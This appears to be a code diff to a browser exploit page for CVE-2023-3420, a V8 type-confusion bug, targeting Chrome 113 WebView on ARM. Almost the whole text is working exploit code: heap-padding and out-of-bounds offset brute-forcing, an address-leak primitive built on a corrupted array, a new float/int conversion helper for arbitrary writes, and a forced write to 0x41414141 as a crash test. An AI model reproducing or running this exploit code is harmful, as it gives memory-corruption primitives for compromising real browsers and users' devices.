@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>CVE-2023-3420 ARM Scanner</title>
+    <title>CVE-2023-3420 ARM Aggressive Scanner</title>
     <style>
         body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; margin: 0; }
         #log { white-space: pre-wrap; word-break: break-all; font-size: 13px; line-height: 1.5; }
@@ -26,25 +26,24 @@
         window.onerror = function(msg) { log(`UNCAUGHT: ${msg}`, 'error'); };
 
         // ==================== 扫描配置 ====================
-        const PADDING_VALUES = [40, 60, 80, 100, 120, 160, 200];
-        const OFFSET_VALUES = [2, 4, 6, 8, 10, 12, 14, 16];
+        const PADDING_VALUES = [];
+        for (let p = 20; p <= 320; p += 20) PADDING_VALUES.push(p);
+        const OFFSET_VALUES = [];
+        for (let o = 2; o <= 32; o += 2) OFFSET_VALUES.push(o);
         let found = false;
-        let bestResult = null;
+        let bestResult = null; // { padding, offset, addr }
+        let totalCombos = PADDING_VALUES.length * OFFSET_VALUES.length;
+        let currentCombo = 0;
+        let lastPadding = null, lastOffset = null; // 用于崩溃测试
 
-        // ==================== 核心利用函数（可重复调用） ====================
+        // ==================== 核心利用函数 ====================
         function tryExploit(padding, oobOffset) {
-            // 每次尝试前先触发垃圾回收，清理上次尝试的内存残留
-            let gcArr = new Array(10000);
+            // 先尝试触发垃圾回收，避免上一次尝试的内存残留
+            let gcArr = new Array(8000);
             for (let i = 0; i < gcArr.length; i++) gcArr[i] = null;
             gcArr = null;
-            
-            // 构建 JIT 反馈
-            for (let i = 0; i < 500; i++) {
-                let dummy = function() {};
-                dummy();
-            }
-            
-            // ---- 初始化 ----
+
+            // 初始化
             let length = 10000;
             var arr = new Array(length);
             arr.fill(0);
@@ -62,6 +61,12 @@
             function ftoi32(f) {
                 dblArr[0] = f;
                 return [intView[0], intView[1]];
+            }
+
+            function i32tof(i1, i2) {
+                intView[0] = i1;
+                intView[1] = i2;
+                return dblArr[0];
             }
 
             var corrupted_arr = [1.1];
@@ -123,50 +128,66 @@
             Object.defineProperty(z, 'aaa', {value: corrupted, writable: true});
             tc(obj1);
 
-            // ---- 读取地址 ----
+            // 尝试 addrof
             oobObjArr[0] = func;
             var addrDbl = corrupted_arr[13];
             var rawAddr = ftoi32(addrDbl)[1];
 
             if (rawAddr === 0 || rawAddr === 0x7ff80000 || rawAddr < 0x100000) {
-                return { success: false, addr: rawAddr, padding: padding, offset: oobOffset };
+                return { success: false, addr: rawAddr, padding, offset: oobOffset };
             }
 
-            // 尝试用这个偏移量做一次完整读取验证
+            // 尝试用此偏移量做一次写测试来验证稳定性
             try {
-                var code = (() => {
-                    var old = corrupted_arr[oobOffset];
-                    corrupted_arr[oobOffset] = view;
-                    var testAddr = ftoi32(oobDblArr[0])[1];
-                    corrupted_arr[oobOffset] = old;
-                    return testAddr;
-                })();
-                if (code && code > 0x100000 && code !== 0x7ff80000) {
-                    return { success: true, addr: rawAddr, padding: padding, offset: oobOffset };
+                var old = corrupted_arr[oobOffset];
+                corrupted_arr[oobOffset] = i32tof(0x12345678, 2);
+                var testVal = ftoi32(oobDblArr[0])[0];
+                corrupted_arr[oobOffset] = old;
+                if (testVal === 0x12345678) {
+                    return { success: true, addr: rawAddr, padding, offset: oobOffset };
                 }
+                // 写测试失败但读到了有效地址，标记为接近
+                return { success: false, near: true, addr: rawAddr, padding, offset: oobOffset };
             } catch(e) {
-                return { success: false, addr: rawAddr, padding: padding, offset: oobOffset, error: e.message };
+                return { success: false, near: true, addr: rawAddr, padding, offset: oobOffset, error: e.message };
             }
-
-            return { success: false, addr: rawAddr, padding: padding, offset: oobOffset };
         }
 
-        // ==================== 自动扫描 ====================
-        log('========== CVE-2023-3420 ARM Auto-Scanner ==========', 'info');
+        // ==================== 扫描主循环 ====================
+        log('========== CVE-2023-3420 ARM Aggressive Scanner ==========', 'info');
         log(`UA: ${navigator.userAgent}`, 'info');
         log(`Platform: ${navigator.platform}`, 'info');
-        log(`Scanning ${PADDING_VALUES.length} paddings × ${OFFSET_VALUES.length} offsets = ${PADDING_VALUES.length * OFFSET_VALUES.length} combinations...`, 'info');
+        log(`Scanning ${PADDING_VALUES.length} paddings × ${OFFSET_VALUES.length} offsets = ${totalCombos} combinations...`, 'info');
         log('', 'info');
 
         function runScan(paddingIndex, offsetIndex) {
             if (found) return;
             if (paddingIndex >= PADDING_VALUES.length) {
+                // 扫描完成
                 log('', 'info');
                 log('========== SCAN COMPLETE ==========', 'info');
                 if (bestResult) {
-                    log(`Best attempt: padding=${bestResult.padding}, offset=${bestResult.offset}, addr=0x${bestResult.addr.toString(16)}`, 'found');
+                    log(`Best near-hit: padding=${bestResult.padding}, offset=${bestResult.offset}, addr=0x${bestResult.addr.toString(16)}`, 'found');
                 } else {
-                    log('No valid combination found. Try expanding PADDING_VALUES or OFFSET_VALUES.', 'error');
+                    log('No valid address read in any combination.', 'error');
+                }
+                log('Attempting crash test with last parameters...', 'info');
+                // 使用最后一次尝试的参数做崩溃测试（已经是触发后的状态，直接强行非法写入）
+                if (lastPadding !== null && lastOffset !== null) {
+                    // 重新触发一次，然后强制写入非法地址
+                    setTimeout(() => {
+                        try {
+                            let result = tryExploit(lastPadding, lastOffset);
+                            // 不管结果，强行向 0x41414141 写入
+                            corrupted_arr[lastOffset] = i32tof(0x41414141, 2);
+                            oobDblArr[0] = 0.0;
+                            log('Crash test executed - if browser did not crash, vulnerability may not be reachable.', 'info');
+                        } catch(e) {
+                            log(`Crash test error: ${e.message}`, 'error');
+                        }
+                    }, 300);
+                } else {
+                    log('No parameters available for crash test.', 'error');
                 }
                 log('Environment: ARM aarch64, Chrome 113, WebView', 'info');
                 return;
@@ -174,56 +195,55 @@
 
             let padding = PADDING_VALUES[paddingIndex];
             let offset = OFFSET_VALUES[offsetIndex];
-            
-            log(`[${paddingIndex+1}/${PADDING_VALUES.length}][${offsetIndex+1}/${OFFSET_VALUES.length}] Testing padding=${padding}, oobOffset=${offset}...`, 'info');
+            lastPadding = padding;
+            lastOffset = offset;
+            currentCombo++;
+            let progress = ((currentCombo / totalCombos) * 100).toFixed(1);
 
             try {
                 let result = tryExploit(padding, offset);
                 if (result.success) {
                     found = true;
                     log(`✅✅✅ SUCCESS! padding=${padding}, oobOffset=${offset}, addr=0x${result.addr.toString(16)}`, 'found');
-                    log('========================================', 'found');
                     log('CVE-2023-3420 is exploitable on this device!', 'found');
-                    log('Use these parameters for the full exploit.', 'found');
-                    log('========================================', 'found');
                     return;
+                } else if (result.near) {
+                    log(`[${progress}%] Near-hit: padding=${padding}, offset=${offset}, addr=0x${result.addr.toString(16)}`, 'info');
+                    if (!bestResult || bestResult.addr === 0x7ff80000 || bestResult.addr === 0) {
+                        bestResult = { padding, offset, addr: result.addr };
+                    }
                 } else {
-                    if (result.addr && result.addr !== 0x7ff80000 && result.addr !== 0 && result.addr > 0x10000) {
-                        log(`  Partial: addr=0x${result.addr.toString(16)} (write validation failed)`, 'info');
-                        if (!bestResult || (bestResult.addr === 0x7ff80000)) {
-                            bestResult = result;
-                        }
-                    } else {
-                        log(`  Failed: addr=0x${(result.addr||0).toString(16)}`, 'info');
+                    // 仅输出进度（每10组打印一次，避免刷屏）
+                    if (currentCombo % 10 === 0 || currentCombo === 1) {
+                        log(`[${progress}%] Testing padding=${padding}, offset=${offset}... (addr=0x${(result.addr||0).toString(16)})`, 'info');
                     }
                 }
             } catch(e) {
-                log(`  CRASHED: ${e.message}`, 'error');
-                log(`  (This is expected - some combos cause memory corruption)`, 'info');
+                log(`[${progress}%] CRASHED: padding=${padding}, offset=${offset} - ${e.message}`, 'error');
+                // 崩溃可能意味着漏洞存在，记录参数
+                if (!bestResult) {
+                    bestResult = { padding, offset, addr: 0, crashed: true };
+                }
             }
 
-            // 下一组参数
+            // 下一组
             let nextOffset = offsetIndex + 1;
             let nextPadding = paddingIndex;
             if (nextOffset >= OFFSET_VALUES.length) {
                 nextOffset = 0;
                 nextPadding = paddingIndex + 1;
             }
-
-            // 使用 setTimeout 让浏览器有机会清理内存
-            setTimeout(() => runScan(nextPadding, nextOffset), 50);
+            setTimeout(() => runScan(nextPadding, nextOffset), 30); // 缩短间隔加快速度
         }
 
         // 启动扫描
         setTimeout(() => runScan(0, 0), 200);
 
-        // ==================== 环境信息 ====================
         log('', 'info');
         log('--- Device Info ---', 'info');
         log(`Hardware Concurrency: ${navigator.hardwareConcurrency}`, 'info');
         log(`Device Memory: ${navigator.deviceMemory || 'N/A'} GB`, 'info');
         log(`Online: ${navigator.onLine}`, 'info');
-        log('', 'info');
         log('Starting scan in 200ms...', 'info');
     </script>
 </body>
